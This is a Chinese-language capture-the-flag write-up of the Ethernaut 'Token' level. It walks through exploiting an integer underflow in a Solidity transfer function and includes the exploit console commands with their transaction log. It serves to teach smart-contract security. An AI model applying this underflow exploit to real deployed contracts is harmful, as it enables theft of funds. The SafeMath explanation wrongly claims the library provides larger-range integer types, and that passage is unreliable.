# 06 Token

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

上面这个合约中, player初始有20个Token, 想办法获得更多

player可以调用`transfer`函数给自己或其他地址转账, 按照正常逻辑, player是永远不能超过20个token的. 

要想player(也就是msg.sender)的余额变化, 只有这句代码 `balances[msg.sender] -= _value;`

也就是

```solidity
balances[msg.sender] = balances[msg.sender] - _value;
```

所以 需要 `balances[msg.sender] - _value;` 大于20 

也就是 `20 - _value > 20` 其中_value为uint, **正常逻辑肯定不行, 唯有溢出**

`mapping(address => uint) balances` 规定`balances[msg.sender]`应该为`uint`, 让`20 - _value `为负,  而产生溢出. 



## 溢出

在 Solidity 中，整数类型的数值可能会发生溢出，导致结果错误或引发异常。

整数溢出指的是整数类型的数值超出了它的最大值或最小值，例如 uint8 类型的数值溢出到了 256，或者 int8 类型的数值溢出到了 -129。

整数溢出可能会导致结果错误，例如在计算两个数值的和时，溢出后的结果可能与预期不符。整数溢出也可能会导致异常，例如当数值溢出到 0 或最大值时，执行除法操作会引发除零异常。

要避免整数溢出，需要在编写智能合约时注意以下几点：

- 合理选择整数类型：应该根据需要选择合适的整数类型，避免选择过小或过大的整数类型。
- 检查数值是否溢出：在执行数值运算时，应该检查结果是否溢出，并在溢出前采取措施防止溢出。
- 使用安全整数类型：如果不确定整数类型是否合适，可以使用安全整数



**另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:**

```
a = a.add(c);
```

如果有溢出, 代码会自动恢复.



## SafeMath

OpenZeppelin 的 SafeMath 库是一个安全整数库，用于在 Solidity 中提供安全整数类型和相关的运算方法。

SafeMath 库实现了一系列安全整数类型，包括 uint8、uint16、uint32、uint64、uint128、uint256 等。这些安全整数类型的取值范围比普通的整数类型更大，可以避免数值溢出的问题。

SafeMath 库还实现了一系列整数运算方法，包括加法、减法、乘法、除法等。这些运算方法在执行运算时会检查结果是否溢出，如果溢出就会抛出异常。这样，在使用 SafeMath 库时，可以确保数值运算的结果是正确的。

使用 SafeMath 库的方式如下

```solidity
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Token {
    using SafeMath for uint256;

    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        totalSupply = _initialSupply;
    }

    function add(uint256 a, uint256 b) public view returns (uint256) {
        // 使用 SafeMath 库的 add 方法执行加法运算
        return a.add(b);
    }
}

```

在上面的例子中，我们首先导入了 SafeMath 库，然后使用 using 关键字将 SafeMath 库的安全整数类型应用到 uint256 上。接着，我们在 add 方法中使用 SafeMath 库的 add



## 参考答案

```js
(await contract.balanceOf(player)).toString();

// 随便转账到一个地址, 这不重要
// 转账金额要大于20 , 让balances[msg.sender] - _value为负数
// 加上引号， 不然js会报大数超范围
await contract.transfer("0x70997970C51812dc3A010C7d01b50e0d17dc79C8", "25");


(await contract.balanceOf(player)).toString();
```





```
(await contract.balanceOf(player)).toString();
"20"
redux-logger.js:1  action SET_BLOCK_NUM @ 16:16:13.064
await contract.transfer("0x70997970C51812dc3A010C7d01b50e0d17dc79C8", "25");
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x554ba66d04bad10a5151b89d2d3f3e5be6decbd7d585ddd298ba77a98a0d9ab4
{tx: "0x554ba66d04bad10a5151b89d2d3f3e5be6decbd7d585ddd298ba77a98a0d9ab4", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x554ba66d04bad10a5151b89d2d3f3e5be6decbd7d585ddd298ba77a98a0d9ab4
redux-logger.js:1  action SET_BLOCK_NUM @ 16:16:53.104
(await contract.balanceOf(player)).toString();
"115792089237316195423570985008687907853269984665640564039457584007913129639931"
^^.js:45 ☚ (<‿<)☚ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:16:55.892
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xe1217a6433af0eef863de2914cc290e95bea3e3a2d4ea4a0125243207684efc5
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:17:09.459
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xe1217a6433af0eef863de2914cc290e95bea3e3a2d4ea4a0125243207684efc5
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:73 【ツ】 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:17:13.108

```

